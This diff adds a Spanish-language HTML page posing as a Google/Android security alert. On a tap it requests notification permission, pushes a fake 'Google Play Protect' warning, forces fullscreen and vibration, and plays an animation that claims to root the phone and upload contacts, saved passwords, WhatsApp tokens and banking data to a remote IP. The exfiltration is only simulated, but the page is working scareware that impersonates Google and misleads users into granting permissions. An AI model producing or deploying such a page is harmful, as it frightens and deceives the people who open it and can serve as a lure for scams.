@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Google Security Alert</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background-color: #121212;
+            color: #e0e0e0;
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+        .danger-icon { color: #ff5252; font-size: 24px; font-weight: bold; }
+        #terminal {
+            flex-grow: 1;
+            font-family: monospace;
+            font-size: 13px;
+            margin-top: 20px;
+            overflow-y: auto;
+            color: #00ff41;
+        }
+        .upload-box {
+            background: #1e1e1e;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #444;
+        }
+        .progress-bar {
+            height: 4px;
+            background: #333;
+            width: 100%;
+            margin-top: 10px;
+            border-radius: 2px;
+        }
+        .fill {
+            height: 100%;
+            background: #ff5252;
+            width: 0%;
+            transition: width 0.4s;
+        }
+        .blink { animation: blinker 1s linear infinite; color: #ff5252; font-weight: bold; }
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
+</head>
+<body onclick="initExploit()">
+
+    <div class="header">
+        <span class="danger-icon">⚠</span>
+        <div>
+            <div style="font-weight: bold;">Alerta de Seguridad de Android</div>
+            <div style="font-size: 11px; color: #888;">ID de Amenaza: #TRJ-9921-X</div>
+        </div>
+    </div>
+
+    <div id="terminal">
+        > Esperando interacción del usuario para diagnóstico...<br>
+        > Pulse en cualquier lugar para escanear archivos.
+    </div>
+
+    <div id="upload-status" style="display:none;">
+        <div class="upload-box">
+            <div style="font-size: 12px;">Exfiltrando: <span id="file-name">WhatsApp_Databases.zip</span></div>
+            <div class="progress-bar"><div id="fill" class="fill"></div></div>
+            <div style="font-size: 10px; margin-top: 5px; text-align: right;" id="perc">0%</div>
+        </div>
+        <div class="blink">ENVIANDO A SERVIDOR REMOTO: 104.21.44.11</div>
+    </div>
+
+    <script>
+        let started = false;
+
+        async function initExploit() {
+            if (started) return;
+            started = true;
+
+            // 1. Pedir permiso de notificación (el gancho)
+            if ("Notification" in window) {
+                const permission = await Notification.requestPermission();
+                if (permission === "granted") {
+                    setTimeout(() => {
+                        new Notification("⚠ Google Play Protect", {
+                            body: "Se ha detectado acceso no autorizado a su galería.",
+                            icon: "https://cdn-icons-png.flaticon.com/512/732/732209.png"
+                        });
+                    }, 3000);
+                }
+            }
+
+            // 2. Pantalla completa
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+
+            // 3. Secuencia de comandos
+            const terminal = document.getElementById('terminal');
+            const upload = document.getElementById('upload-status');
+            const fileName = document.getElementById('file-name');
+            const fill = document.getElementById('fill');
+            const perc = document.getElementById('perc');
+
+            const files = [
+                "Contacts_Backup.vcf",
+                "DCIM_Camera_Secret.vault",
+                "Chrome_Saved_Passwords.db",
+                "WhatsApp_Key_Auth.token",
+                "Banking_App_Cache.tmp"
+            ];
+
+            terminal.innerHTML = "> Accediendo a permisos de Superusuario...<br>> [OK] UID: 0 (root)<br>> Iniciando volcado de memoria...<br>";
+
+            let fileIndex = 0;
+            upload.style.display = "block";
+
+            const interval = setInterval(() => {
+                let p = parseInt(fill.style.width) || 0;
+                
+                if (p < 100) {
+                    p += Math.floor(Math.random() * 20);
+                    if (p > 100) p = 100;
+                    fill.style.width = p + "%";
+                    perc.innerText = p + "%";
+                    if (navigator.vibrate) navigator.vibrate(50);
+                } else {
+                    if (fileIndex < files.length) {
+                        terminal.innerHTML += `> <span style="color:white">[SUCCESS]</span> ${files[fileIndex]} enviado.<br>`;
+                        fileIndex++;
+                        fill.style.width = "0%";
+                        fileName.innerText = files[fileIndex] || "Finalizando...";
+                        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+                    } else {
+                        clearInterval(interval);
+                        terminal.innerHTML += "<br><span class='blink'>[-] SISTEMA COMPROMETIDO. BORRANDO RASTROS...</span>";
+                        setTimeout(() => {
+                            document.body.innerHTML = "";
+                            document.body.style.backgroundColor = "black";
+                        }, 3000);
+                    }
+                }
+            }, 800);
+        }
+    </script>
+</body>
+</html>
